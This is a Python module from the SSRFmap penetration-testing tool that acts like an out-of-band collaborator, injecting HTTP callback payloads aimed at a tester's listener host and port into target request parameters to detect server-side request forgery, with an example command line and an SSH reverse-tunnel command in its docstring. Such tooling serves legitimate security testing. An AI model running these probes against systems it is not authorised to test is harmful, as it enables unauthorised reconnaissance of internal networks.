from ssrfmap.core.utils import *
from ssrfmap.core.handler import Handler
import re
import logging
import urllib.parse

"""
Example:
```
~$ python3 ssrfmap.py -v -r data/request.txt -p url,path --lhost=public-ip --lport 4242 -m httpcollaborator -l http
```
Use ssh/autossh to established remote tunnel between public and localhost handler if running module locally against remote target
```
~$ ssh -fN -R public-ip:4242:127.0.0.1:4242 username@public-ip
```
"""

name          = "httpcollaborator"
description   = "This module act like burpsuite collaborator through http protocol to detect if target parameters are prone to ssrf"
author        = "xyzkab"
documentation = []

class exploit():
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = "4242"

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # Handle args for httpcollaborator
        if args.lhost == None: self.SERVER_HOST = input("Server Host:")
        else:                  self.SERVER_HOST = args.lhost

        if args.lport == None: self.SERVER_PORT = input("Server Port:")
        else:                  self.SERVER_PORT = args.lport

        params = args.param.split(",")
        for param in params:
            logging.info("Testing PARAM: {}".format(param))
            payload = wrapper_http("?{}".format(param), args.lhost, args.lport.strip() )
            r = requester.do_request(param, payload)

        logging.info("Module '{}' finished !".format(name))
